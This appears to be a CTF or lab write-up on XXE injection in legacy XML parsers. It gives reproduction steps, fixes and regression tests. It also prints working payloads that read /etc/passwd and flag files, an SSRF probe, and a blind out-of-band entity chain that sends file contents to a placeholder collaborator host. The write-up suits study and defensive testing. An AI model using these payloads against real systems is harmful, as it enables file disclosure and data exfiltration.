# XXE In Legacy XML Parsers

## Date

2026-07-08

## Target Type

Web application XML upload/parse endpoint

## Bug Class

XXE (XML External Entity injection), local file disclosure, unsafe DTD handling

## Initial Signal

An application accepts XML documents and mentions:

- legacy XML support
- partner integrations
- DTD compatibility
- manifest/report parsing
- old SOAP/XML-RPC behavior

The parsed values are reflected in API output or UI fields.

## Working Theory

If the parser resolves DTDs or external entities, attacker-controlled XML can define an entity with a `SYSTEM` identifier pointing at a local file or URL. Referencing that entity during parse expands it into document content.

## Trust Boundary

XML input is untrusted user content. The parser must not perform external resolution, network fetches, or local file reads while building the document tree.

## Minimal Reproduction

1. Identify the XML submission endpoint and reflected fields.
2. Submit valid XML without entities to confirm parsing behavior.
3. Add an inline DOCTYPE with a general external entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<doc>
  <title>&xxe;</title>
  <body>test</body>
</doc>
```

4. Place the entity reference in a field known to be returned by the server.
5. Inspect the response for expanded file contents.

## Reflection Points To Test First

- `title`, `body`, `name`, `value`
- error messages
- attribute values
- any field shown in JSON/HTML after parsing

## Why Failed Tests May Fail

- External entities disabled, but parameter entities still work in some parsers.
- File contents appear only in errors, logs, or secondary fields.
- Output encoding or truncation hides the disclosure.
- The target path is wrong for the OS or container layout.
- Blind parsing requires out-of-band exfiltration instead of direct reflection.

## Why Working Test Works

Legacy XML compatibility often leaves DTD processing enabled for old clients. A `SYSTEM "file:///path"` entity is resolved during parse and substituted wherever `&entity;` appears, turning XML parsing into a file-read primitive.

## Common Variations

Direct reflected read:

```xml
<!ENTITY xxe SYSTEM "file:///flag.txt">
```

PHP base64 filter when special characters break XML:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
```

HTTP SSRF probe:

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
```

Blind/out-of-band exfil when no direct reflection exists:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://[collaborator]/?x=%file;'>">
%eval;
%exfil;
```

## Impact

- Read local files accessible to the parser process.
- SSRF to internal services in some configurations.
- Denial of service through billion laughs / large entity expansion.
- Secret disclosure when parsed output, logs, or downstream systems expose expanded values.

## Fix

- Disable external entity loading and DTD processing for untrusted XML.
- Use parser options that reject DOCTYPE entirely when possible.
- Validate against a strict schema without expanding external entities.
- Avoid reflecting raw parsed XML values without understanding entity expansion already occurred.
- Add tests for `file://`, `http://`, `expect://`, and parameter-entity payloads.

## Regression Test

- Inline external entity payloads are rejected or sanitized with no file contents in output.
- Parser does not fetch remote URLs during document load.
- Error responses do not leak file contents from failed entity resolution.
- Legacy compatibility mode, if required, is isolated to authenticated trusted integrations only.

## Future Checklist Item

Any time an app parses XML and mentions legacy compatibility, test a minimal inline DTD with `file:///etc/passwd` or the lab-provided path in every reflected field before moving to blind XXE.
